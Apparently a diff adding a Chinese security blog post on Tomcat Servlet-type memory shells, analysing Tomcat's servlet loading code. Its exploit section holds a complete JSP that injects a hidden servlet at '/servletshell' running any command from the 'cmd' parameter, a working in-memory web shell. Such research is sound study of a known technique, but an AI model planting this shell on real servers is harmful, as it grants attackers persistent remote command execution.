@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="desktop" > 
+<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Tomcat内存马:Servlet型 | F4miti0n&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="流程分析众所周知在Tomcat进行初始化的时候，三大组件遵循:Listener -&gt; Filter -&gt; Servlet 的加载顺序。调用栈大体如下，这里就不带着分析了，是在StandardContext#startInternal里面按顺序加载的。我们直接来到栈顶的 StandardContext#configureContext() 这里。这个方法里面通过对web.xml进行解析，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat内存马:Servlet型">
+<meta property="og:url" content="http://example.com/2023/08/19/Servlet%E5%9E%8B/index.html">
+<meta property="og:site_name" content="F4miti0n&#39;s Blog">
+<meta property="og:description" content="流程分析众所周知在Tomcat进行初始化的时候，三大组件遵循:Listener -&gt; Filter -&gt; Servlet 的加载顺序。调用栈大体如下，这里就不带着分析了，是在StandardContext#startInternal里面按顺序加载的。我们直接来到栈顶的 StandardContext#configureContext() 这里。这个方法里面通过对web.xml进行解析，">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/cover4.jpg">
+<meta property="article:published_time" content="2023-08-19T06:50:08.000Z">
+<meta property="article:modified_time" content="2023-08-21T02:15:26.018Z">
+<meta property="article:author" content="F4miti0n">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/cover4.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="F4miti0n's Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/banner.png" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>F4miti0n's Blog </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
+      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <span class="material-symbols-rounded rss">rss_feed</span>
+      </a>
+    
+    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
+      <span class="material-symbols-rounded">search</span>
+    </a>
+    <div id="nav-menu-btn" class="nav-icon">
+      <span class="material-symbols-rounded">menu</span>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <img src="/images/avatar.png" alt="avatar">
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">F4miti0n </div>
+      <div class="dot"></div>
+      <div class="subtitle">每天都在对抗无趣的生活 </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF%E5%A4%8D%E7%8E%B0/" rel="tag">CTF复现</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF%E6%80%BB%E7%BB%93/" rel="tag">CTF总结</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F/" rel="tag">安卓渗透</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E9%97%B2%E8%B0%88/" rel="tag">闲谈</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Archives</h3>
+      
+      
+        <a class="archive-link" href="/archives/2024/03 ">
+          March 2024 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/02 ">
+          February 2024 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/01 ">
+          January 2024 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/11 ">
+          November 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/10 ">
+          October 2023 
+          <div class="archive-count">3 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/09 ">
+          September 2023 
+          <div class="archive-count">6 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/08 ">
+          August 2023 
+          <div class="archive-count">7 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/07 ">
+          July 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/05 ">
+          May 2023 
+          <div class="archive-count">3 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/04 ">
+          April 2023 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/03 ">
+          March 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2024/03/10/RASPDemo/">
+            <div class="recent-link-text">
+              从零开始的RASP学习
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)/">
+            <div class="recent-link-text">
+              Weblogic漏洞分析(一)
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/19/Jackson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(%E4%B8%80)/">
+            <div class="recent-link-text">
+              Jackson漏洞分析 (一)
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/01/01/2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">
+            <div class="recent-link-text">
+              关于2023的年度总结
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2023/11/05/Mysql%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
+            <div class="recent-link-text">
+              Mysql任意文件读取
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+<article id="post-Servlet型" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+<div class="article-gallery">
+  <div class="article-gallery-photos">
+    
+      <a class="article-gallery-img" rel="gallery_cmljqmlrh000wm0wd78k3djjt">
+        <img src="/images/cover4.jpg" itemprop="image">
+      </a>
+    
+  </div>
+</div>
+
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        Tomcat内存马:Servlet型
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2023-08-19T06:50:08.000Z" itemprop="datePublished">2023-08-19</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+    Uncategorized 
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            869 words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>众所周知在Tomcat进行初始化的时候，三大组件遵循:Listener -&gt; Filter -&gt; Servlet 的加载顺序。调用栈大体如下，这里就不带着分析了，是在StandardContext#startInternal里面按顺序加载的。<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820003132.png"><br>我们直接来到栈顶的 <code>StandardContext#configureContext()</code> 这里。这个方法里面通过对web.xml进行解析，按照顺序把filterMaps，filterDef，StandardWrapper这样的对象给创建了出来，我们这里重点关注一下StandardWrapper这一部分。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">        <span class="comment">// As far as possible, process in alphabetical order so it is easy to</span></span><br><span class="line">        <span class="comment">// check everything is present</span></span><br><span class="line">        <span class="comment">// Some validation depends on correct public ID</span></span><br><span class="line">        context.setPublicId(webxml.getPublicId());</span><br><span class="line">...   <span class="comment">//设置StandardContext参数</span></span><br><span class="line">        <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">            <span class="comment">//创建StandardWrapper对象</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//设置LoadOnStartup属性</span></span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//设置ServletName属性</span></span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//设置ServletClass属性</span></span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            ...</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">            <span class="comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span></span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line">           <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">            <span class="comment">//添加路径映射</span></span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//上面这段加注释的都是搬运参考的，确实写的很好嗷</span></span><br></pre></td></tr></table></figure>
+
+<p>在这段代码里，configureContext成功把StandWrapper创建了出来，并添加到了context.children里面。<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Q34N%60%28%40L~R%29R9%5BSIRSTW%5D%5B5.png"></p>
+<p>创建完了之后，<code>fireLifecycleEvent</code>基本就是个出栈的过程了。我们回到<code>StandardContext</code>这里，继续跟进一下剩下的<code>StandardWrapper</code>加载流程。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820005012.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820005838.png"><br>把前置条件都准备好了，我们来到loadOnstartup这里，也就是加载Servlet的部分这里，由于loadOnStartUp这里比较重要，我们直接粘贴出来，就不截图了。<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820010106.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line">      <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span></span><br><span class="line">      TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">      <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">          <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">          <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line">          <span class="comment">//判断loadOnStartup的值，如果小于零直接不加载</span></span><br><span class="line">          <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">          ArrayList&lt;Wrapper&gt; list = map.get(key);</span><br><span class="line">          <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">              list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">              map.put(key, list);</span><br><span class="line">          &#125;</span><br><span class="line">          list.add(wrapper);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">      <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">          <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">              <span class="keyword">try</span> &#123;</span><br><span class="line">                  wrapper.load();</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure>
+
+<p>引用一下其他师傅给这里的分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意这里对于Wrapper对象中`loadOnStartup`属性的值进行判断，只有大于0的才会被放入list进行后续的`wrapper.load()`加载调用。</span><br><span class="line"></span><br><span class="line">这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过`loadOnStartup`属性值来设置每个Servlet的启动顺序。默认值为-1，此时只有当Servlet被调用时才加载到内存中。</span><br></pre></td></tr></table></figure>
+
+<p>到这里为止Servlet的加载流程基本就结束了，正式来到Exp编写环节</p>
+<h3 id="Exp编写（引用）"><a href="#Exp编写（引用）" class="headerlink" title="Exp编写（引用）"></a>Exp编写（引用）</h3><p>通过上文的分析我们能够总结出创建Servlet的流程<br>1.获取StandardContext对象<br>2.编写恶意Servlet<br>3.通过StandardContext.createWrapper()创建StandardWrapper对象<br>4.设置StandardWrapper对象的loadOnStartup属性值<br>5.设置StandardWrapper对象的ServletName属性值<br>6.设置StandardWrapper对象的ServletClass属性值<br>7.将StandardWrapper对象添加进StandardContext对象的children属性中<br>8.通过StandardContext.addServletMappingDecoded()添加对应的路径映射</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);  </span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();  </span><br><span class="line">%&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;%!  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">        &#125;        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;  </span><br><span class="line">                <span class="keyword">try</span>&#123;  </span><br><span class="line">                    Runtime.getRuntime().exec(cmd);  </span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;  </span><br><span class="line">                    n.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;        &#125;        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">        &#125;    &#125;  </span><br><span class="line">%&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();  </span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shell_servlet.getClass().getSimpleName();  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();  </span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);  </span><br><span class="line">    wrapper.setName(name);  </span><br><span class="line">    wrapper.setServlet(shell_servlet);  </span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());  </span><br><span class="line">%&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;%  </span><br><span class="line">    standardContext.addChild(wrapper);  </span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/servletshell&quot;</span>,name);  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>运行结果如下<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820011751.png"></p>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/2023/08/19/Valve%E5%9E%8B/"
+      title="Tomcat内存马:Valve型"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        Tomcat内存马:Valve型
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2023/08/19/Listener%E5%9E%8B/"
+      title="Tomcat内存马:Listener型"
+     >
+
+    <p class="title-text">
+      
+        Tomcat内存马:Listener型
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2026 F4miti0n<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
+        <span class="material-symbols-rounded">keyboard_arrow_up</span>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.style.opacity = 1;
+        } else {
+            btn.style.opacity = 0;
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
